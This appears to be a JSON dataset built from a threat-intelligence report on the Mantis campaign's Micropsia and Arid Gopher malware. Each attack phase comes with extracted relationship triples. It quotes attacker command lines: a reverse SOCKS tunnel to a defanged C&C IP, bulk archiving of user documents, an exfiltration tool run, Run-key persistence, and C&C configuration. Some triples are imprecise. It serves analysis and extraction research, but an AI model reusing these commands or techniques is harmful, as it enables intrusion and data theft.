[
    {
        "phase": "initial access",
        "content": "The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target's network.\nThe following is a description of how one of those three toolsets was used:\nThe first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444.\nThe attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty,a publicly available SSH client, using Certutil and BITSAdmin\nMicropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name:\ncsidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe\ncsidl_common_appdata\\windowsps\\windowsps.exe\nOn one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address:\nCSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED]\nOn December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.\nThe following day, December 21, RAR was executed to archive files on another infected computer.\nBetween December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers).\nOn December 28, Micropsia was used to run windowspackages.exe on three more infected computers.\nOn December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers.\nOn January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear.\nOn January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file:\nCSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar\nOn January 9, Arid Gopher was used to execute two unknown files on a single computer:\ncsidl_common_appdata\\teamviewrremoteservice\\teamviewrremoteservice.exe\ncsidl_common_appdata\\embededmodeservice\\embededmodeservice.exe\nThe last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.",
        "relationship": "1. [Relationships]: <process:PowerShell,executed,process:Base64-encoded string>. \n2. [Relationships]: <process:shellcode,downloaded,socket:104.194.222[.]50 port 4444>. \n3. [Relationships]: <process:Certutil,downloaded,file:Micropsia backdoor>. \n4. [Relationships]: <process:Certutil,downloaded,file:Putty>. \n5. [Relationships]: <process:Micropsia,initiated,socket:C&C server>. \n6. [Relationships]: <process:Micropsia,executed,file:csidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe>. \n7. [Relationships]: <process:Micropsia,executed,file:csidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe>. \n8. [Relationships]: <process:Micropsia,executed,file:csidl_common_appdata\\windowsps\\windowsps.exe>. \n9. [Relationships]: <process:Micropsia,used,process:CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe>. \n10. [Relationships]: <process:Micropsia,used,process:CSIDL_COMMON_APPDATA\\windowspackages.exe>. \n11. [Relationships]: <process:RAR,executed,file:archived files>. \n12. [Relationships]: <process:Micropsia,executed,file:Arid Gopher backdoor>. \n13. [Relationships]: <process:Arid Gopher,used,process:SetRegRunKey.exe>. \n14. [Relationships]: <process:Arid Gopher,used,process:localsecuritypolicy.exe>. \n15. [Relationships]: <process:Micropsia,used,process:CSIDL_COMMON_APPDATA\\hostupbroker\\hostupbroker.exe>. \n16. [Relationships]: <process:windowsupserv.exe,exfiltrated,file:CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar>. \n17. [Relationships]: <process:Arid Gopher,executed,file:csidl_common_appdata\\teamviewrremoteservice\\teamviewrremoteservice.exe>. \n18. [Relationships]: <process:Arid Gopher,executed,file:csidl_common_appdata\\embededmodeservice\\embededmodeservice.exe>. \n19. [Relationships]: <process:Arid Gopher,executed,file:localsecuritypolicy.exe>. "
    },
    {
        "phase": "execution",
        "content": "Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths:\ncsidl_common_appdata\\microsoft\\dotnet35\\microsoftdotnet35.exe\ncsidl_common_appdata\\microsoftservicesusermanual\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe\ncsidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe\ncsidl_common_appdata\\windowsps\\windowsps.exe\nMicropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included:\nArid Gopher (file names: networkvirtualizationstartservice.exe, networkvirtualizationfiaservice.exe, networkvirtualizationseoservice.exe)\nReverse SOCKs Tunneler(aka Revsocks) (file name: windowsservicemanageav.exe)\nData Exfiltration Tool (file name: windowsupserv.exe)\nTwo unknown files, both named hostupbroker.exe\nUnknown file named windowspackages.exe\nIn addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration:\n\"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\"",
        "relationship": "1. [Relationships]: <process:WMI,executed,process:Micropsia>. \n2. [Relationships]: <process:Micropsia,running,process:Arid Gopher>. \n3. [Relationships]: <process:Micropsia,running,process:Reverse SOCKs Tunneler>. \n4. [Relationships]: <process:Micropsia,running,process:Data Exfiltration Tool>. \n5. [Relationships]: <process:Micropsia,running,process:hostupbroker.exe>. \n6. [Relationships]: <process:Micropsia,running,process:windowspackages.exe>. \n7. [Relationships]: <process:Micropsia,taking,process:screenshots>. \n8. [Relationships]: <process:Micropsia,keylogging,none>. \n9. [Relationships]: <process:Micropsia,archiving,file:%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41>. "
    },
    {
        "phase": "execution",
        "content": "Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components:\n7za.exe – A copy of the legitimate 7-Zip executable\nAttestationWmiProvider.exe – A tool that sets a \"run\" registry value\nServiceHubIdentityHost.exe – A copy of legitimate Shortcut.exe executable from Optimum X\nSetup.env – Configuration file\nArid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor.\nWhen communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands:\nConnects to: http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134) - likely to register device\nFollowed by: http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands\nConnects to: http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32) - likely to register device\nArid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually.\nThe embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following:\nDIR=WindowsPerceptionService\nENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER\nLOGS=logs.txt\nDID=code.txt\nVER=6.1\nEN=2\nST_METHOD=r\nST_MACHINE=false\nST_FLAGS=x\nCOMPRESSOR=7za.exe\nDDIR=ResourcesFiles\nBW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002\nSERVER_TOKEN=PDqMKZ91l2XDmDELOrKB\nSTAPP=AttestationWmiProvider.exe\nSHORT_APP=ServiceHubIdentityHost.exe\nThe setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments:\n\"key\" with string parameter [RUN_VALUE_NAME]\n\"value\" with string parameter [RUN_PATHNAME]\nIt then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value:\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\"\nOur investigation so far shows this file setting Arid Gopher to run on reboot:\nCSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\"",
        "relationship": "1. [Relationships]: <process:Arid Gopher,registers,socket:http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134)>. \n2. [Relationships]: <process:Arid Gopher,connects,socket:http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC>. \n3. [Relationships]: <process:Arid Gopher,registers,socket:http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32)>. \n4. [Relationships]: <process:Arid Gopher,uses,file:setup.env>. \n5. [Relationships]: <process:AttestationWmiProvider.exe,sets,reg:HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\">. "
    },
    {
        "phase": "exfiltration",
        "content": "The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments:\n\"-d\" \"[FILE_DIRECTORY]\"\n\"-f\" \"[FILENAME]\"\nFor each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file.\nWhen uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters:\n\"kjdfnqweb\": [THE_FILE_CONTENT]\n\"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER]\nWhenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files:\n\"C:\\ProgramData\\WindowsUpServ\\success.txt\"\n\"C:\\ProgramData\\WindowsUpServ\\err.txt\"",
        "relationship": "1. [Relationships]: <process:WindowsUpServ.exe,uploads,file:[FILENAME]>. \n2. [Relationships]: <process:WindowsUpServ.exe,obtains,file:[FILE_DIRECTORY]>. \n3. [Relationships]: <process:WindowsUpServ.exe,sends,socket:HTTP POST request to C&C server>. \n4. [Relationships]: <process:remote server,deletes,file:uploaded file>. \n5. [Relationships]: <process:WindowsUpServ.exe,logs,file:C:\\ProgramData\\WindowsUpServ\\success.txt>. \n6. [Relationships]: <process:WindowsUpServ.exe,logs,file:C:\\ProgramData\\WindowsUpServ\\err.txt>. "
    }
]